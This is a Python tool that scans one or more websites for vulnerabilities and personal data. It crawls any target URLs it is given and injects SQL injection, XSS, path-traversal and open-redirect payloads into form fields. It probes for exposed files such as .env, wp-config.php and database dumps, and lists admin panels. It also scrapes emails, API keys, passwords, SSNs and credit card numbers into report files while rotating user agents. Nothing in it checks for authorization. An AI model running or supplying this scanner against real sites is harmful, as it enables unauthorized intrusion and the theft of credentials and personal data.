# Multi-Target Web Vulnerability & Sensitive Data Scanner
# Supports single URL, multiple comma-separated URLs, or a file containing URLs (one per line).
# Usage:
#   python scanner.py <target_url>
#   python scanner.py <url1>,<url2>,<url3>
#   python scanner.py --target-file targets.txt [--depth 2] [--threads 10]
# Requirements: requests, beautifulsoup4, lxml

import sys
import re
import urllib.parse
import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import os
import random

# ---------- CONFIGURATION ----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Safari/537.36",
]
TIMEOUT = 8
MAX_DEPTH = 2
THREADS = 10
OUTPUT_FILE = "scan_results.txt"  # will be appended with target index for multi-target
SENSITIVE_FILES = [
    ".env", ".git/config", "wp-config.php", "config.php", "database.yml",
    "admin.php", "phpinfo.php", "backup.sql", "dump.sql", "credentials.txt"
]
COMMON_ADMIN_PATHS = [
    "admin", "administrator", "wp-admin", "login", "cpanel", "phpmyadmin",
    "manager", "controlpanel", "admin.php", "user/login", "auth/login"
]
SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' --", "\" --", "';--", "\";--"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "\"><script>alert(1)</script>", "javascript:alert(1)"]
LFI_PAYLOADS = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd"]
SENSITIVE_PATTERNS = {
    "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
    "phone": r"(\+?\d{1,3}[-.\s]?)?\(?\d{2,4}\)?[-.\s]?\d{2,4}[-.\s]?\d{2,4}",
    "api_key": r"(?i)(api[_-]?key|apikey|secret|token)['\":\s]*[=:]\s*['\"]?([A-Za-z0-9+/=_-]{20,})['\"]?",
    "password_in_html": r"(?i)(password|passwd|pwd)[\s=:]+['\"]?([^'\"\s<>]+)",
    "hidden_input": r"<input[^>]*type=[\"']hidden[\"'][^>]*name=[\"']([^\"']+)[\"'][^>]*value=[\"']([^\"']*)[\"']",
    "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
    "credit_card": r"\b(?:\d{4}[ -]?){3}\d{4}\b"
}

# ---------- GLOBAL STATE PER TARGET ----------
# Resets for each target
url_queue = queue.Queue()
visited_urls = set()
vulnerabilities = []
extracted_data = {"emails": set(), "phones": set(), "api_keys": set(), "passwords": set(), "hidden_inputs": {}, "ssn": set(), "credit_cards": set()}
lock = threading.Lock()
target_host = ""

def reset_global_state():
    global url_queue, visited_urls, vulnerabilities, extracted_data
    url_queue = queue.Queue()
    visited_urls.clear()
    vulnerabilities.clear()
    extracted_data = {"emails": set(), "phones": set(), "api_keys": set(), "passwords": set(), "hidden_inputs": {}, "ssn": set(), "credit_cards": set()}

def random_agent():
    return random.choice(USER_AGENTS)

def make_request(url, params=None, cookies=None, method="GET", data=None, allow_redirects=True):
    headers = {"User-Agent": random_agent()}
    try:
        if method == "GET":
            resp = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=TIMEOUT, allow_redirects=allow_redirects)
        else:
            resp = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=TIMEOUT, allow_redirects=allow_redirects)
        return resp
    except requests.RequestException:
        return None

# ---------- CORE SCANNING FUNCTIONS (unchanged except for allow_redirects in scan_open_redirect) ----------
def scan_sql_injection(url, param):
    sqli_errors = [
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "Unclosed quotation mark",
        "you have an error in your SQL syntax", "Warning: mysql"
    ]
    vulnerable = False
    for payload in SQLI_PAYLOADS:
        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
        resp = make_request(test_url)
        if resp:
            content = resp.text.lower()
            for err in sqli_errors:
                if err.lower() in content:
                    with lock:
                        vulnerabilities.append(f"[SQL Injection] Parameter '{param}' with payload '{payload}' on {test_url} => Possible SQLi (error '{err}')")
                    vulnerable = True
                    break
            if vulnerable:
                break
    return vulnerable

def scan_xss(url, param):
    test_payload = "<scrIpt>alert(1)</scrIpt>"  # mixed case
    test_url = url + "?" + param + "=" + urllib.parse.quote(test_payload)
    resp = make_request(test_url)
    if resp and test_payload in resp.text:
        with lock:
            vulnerabilities.append(f"[XSS] Reflected XSS found in parameter '{param}' on {url}")
        return True
    return False

def scan_lfi(url, param):
    for payload in LFI_PAYLOADS:
        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
        resp = make_request(test_url)
        if resp:
            if "root:x:" in resp.text or "[boot loader]" in resp.text or "Windows" in resp.text:
                with lock:
                    vulnerabilities.append(f"[LFI] Possible LFI in parameter '{param}' with payload '{payload}' on {url}")
                return True
    return False

def scan_open_redirect(url, param):
    redirect_test = "https://evil.com"
    test_url = url + "?" + param + "=" + urllib.parse.quote(redirect_test)
    resp = make_request(test_url, allow_redirects=False)
    if resp and resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get("Location", "")
        if redirect_test in location:
            with lock:
                vulnerabilities.append(f"[Open Redirect] Parameter '{param}' redirects to external site on {url}")
            return True
    return False

def check_sensitive_file(base_url, path):
    full_url = urllib.parse.urljoin(base_url, path)
    resp = make_request(full_url)
    if resp and resp.status_code == 200:
        content_size = len(resp.content)
        if content_size > 10:
            with lock:
                vulnerabilities.append(f"[Sensitive File Exposure] Found {full_url} (size {content_size} bytes)")
            extract_sensitive_data(resp.text, full_url)
            return True
    return False

def enumerate_admin_panels(base_url):
    for path in COMMON_ADMIN_PATHS:
        full_url = urllib.parse.urljoin(base_url, path)
        resp = make_request(full_url)
        if resp and resp.status_code == 200:
            if any(kw in resp.text.lower() for kw in ["password", "username", "admin", "dashboard", "login"]):
                with lock:
                    vulnerabilities.append(f"[Admin Panel Found] {full_url} (status 200, contains auth keywords)")
                extract_sensitive_data(resp.text, full_url)

def extract_sensitive_data(html, source_url):
    for category, pattern in SENSITIVE_PATTERNS.items():
        matches = re.findall(pattern, html, re.IGNORECASE)
        if category == "hidden_input":
            for name, value in matches:
                with lock:
                    extracted_data["hidden_inputs"][source_url] = extracted_data["hidden_inputs"].get(source_url, [])
                    extracted_data["hidden_inputs"][source_url].append(f"{name}={value}")
        else:
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0] if match[0] else match[1]
                with lock:
                    getattr(extracted_data[category], 'add')(match)

def crawl_page(url, depth):
    if depth > MAX_DEPTH or url in visited_urls:
        return
    with lock:
        visited_urls.add(url)
    resp = make_request(url)
    if not resp or resp.status_code != 200:
        return
    html = resp.text
    soup = BeautifulSoup(html, "lxml")
    # Extract links
    for link in soup.find_all("a", href=True):
        href = link["href"]
        full_link = urllib.parse.urljoin(url, href)
        if full_link.startswith(("http://", "https://")) and not full_link.startswith("javascript:"):
            # Only crawl links within the same target host
            if urllib.parse.urlparse(full_link).netloc == target_host:
                with lock:
                    if full_link not in visited_urls:
                        url_queue.put((full_link, depth+1))
    # Extract forms
    forms = soup.find_all("form")
    for form in forms:
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        params = {}
        for inp in inputs:
            name = inp.get("name")
            if name:
                params[name] = inp.get("value", "")
        action_url = urllib.parse.urljoin(url, action)
        for param in params:
            scan_sql_injection(action_url, param)
            scan_xss(action_url, param)
            scan_lfi(action_url, param)
            scan_open_redirect(action_url, param)
    extract_sensitive_data(html, url)
    # Perform file and admin checks only at root depth
    if depth == 0:
        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for sfile in SENSITIVE_FILES:
            check_sensitive_file(base, sfile)
        enumerate_admin_panels(base)

def worker():
    while True:
        try:
            url, depth = url_queue.get(timeout=3)
        except queue.Empty:
            break
        crawl_page(url, depth)
        url_queue.task_done()

# ---------- TARGET SCAN ORCHESTRATOR ----------
def scan_target(target_url, index=1):
    global target_host
    reset_global_state()
    parsed = urllib.parse.urlparse(target_url)
    target_host = parsed.netloc
    if not target_host:
        print(f"[-] Invalid URL: {target_url}")
        return
    print(f"\n[=== SCANNING TARGET {index}: {target_url} ===]")
    start_time = time.time()
    url_queue.put((target_url, 0))
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    url_queue.join()
    for t in threads:
        t.join(timeout=1)
    # Results
    print(f"\n[+] Scan completed for {target_url}")
    print("[+] Vulnerabilities found:")
    for vuln in vulnerabilities:
        print(f"  - {vuln}")
    print("\n[+] Extracted Sensitive Data:")
    for cat, data in extracted_data.items():
        if cat == "hidden_inputs":
            for page, inputs in data.items():
                print(f"  Hidden inputs on {page}: {', '.join(inputs)}")
        else:
            if data:
                print(f"  {cat}: {', '.join(list(data)[:20])}")
    # Save to file (append if multiple targets)
    save_results(target_url, index)
    elapsed = time.time() - start_time
    print(f"[*] Elapsed: {elapsed:.2f} sec\n")

def save_results(target_url, index):
    # Use a suffix per target to avoid overwrites
    safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', target_url.strip())
    out_file = f"scan_{index}_{safe_name}.txt"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write(f"===== SCAN REPORT FOR {target_url} =====\n\n")
        f.write("===== VULNERABILITIES =====\n")
        f.write("\n".join(vulnerabilities) + "\n\n")
        f.write("===== SENSITIVE DATA =====\n")
        for cat, items in extracted_data.items():
            f.write(f"\n--- {cat} ---\n")
            if cat == "hidden_inputs":
                for page, inputs in items.items():
                    f.write(f"  {page}: {inputs}\n")
            else:
                for item in items:
                    f.write(f"  {item}\n")
    print(f"[*] Detailed results saved to {out_file}")

def load_targets_from_file(filepath):
    targets = []
    try:
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)
    except Exception as e:
        print(f"[-] Error reading target file: {e}")
        sys.exit(1)
    return targets

def main():
    # Parse arguments to support:
    # 1. python scanner.py single_url
    # 2. python scanner.py url1,url2,url3
    # 3. python scanner.py --target-file targets.txt [--depth X] [--threads Y]
    global MAX_DEPTH, THREADS
    targets = []
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg == "--target-file":
            if i+1 < len(sys.argv):
                filepath = sys.argv[i+1]
                targets.extend(load_targets_from_file(filepath))
                i += 2
            else:
                print("[-] --target-file requires a path")
                sys.exit(1)
        elif arg == "--depth":
            if i+1 < len(sys.argv):
                MAX_DEPTH = int(sys.argv[i+1])
                i += 2
        elif arg == "--threads":
            if i+1 < len(sys.argv):
                THREADS = int(sys.argv[i+1])
                i += 2
        elif not arg.startswith("--"):
            # Could be a URL or a comma-separated list of URLs
            if ',' in arg:
                targets.extend([u.strip() for u in arg.split(",") if u.strip()])
            else:
                targets.append(arg)
            i += 1
        else:
            i += 1  # unknown flag, skip
    if not targets:
        print("Usage: python scanner.py <target_url> [,<url2>,...] | --target-file <file> [--depth 2] [--threads 10]")
        sys.exit(1)
    print(f"[*] Loaded {len(targets)} target(s).")
    for idx, target in enumerate(targets, start=1):
        # Ensure URL has scheme
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        scan_target(target, idx)

if __name__ == "__main__":
    main()
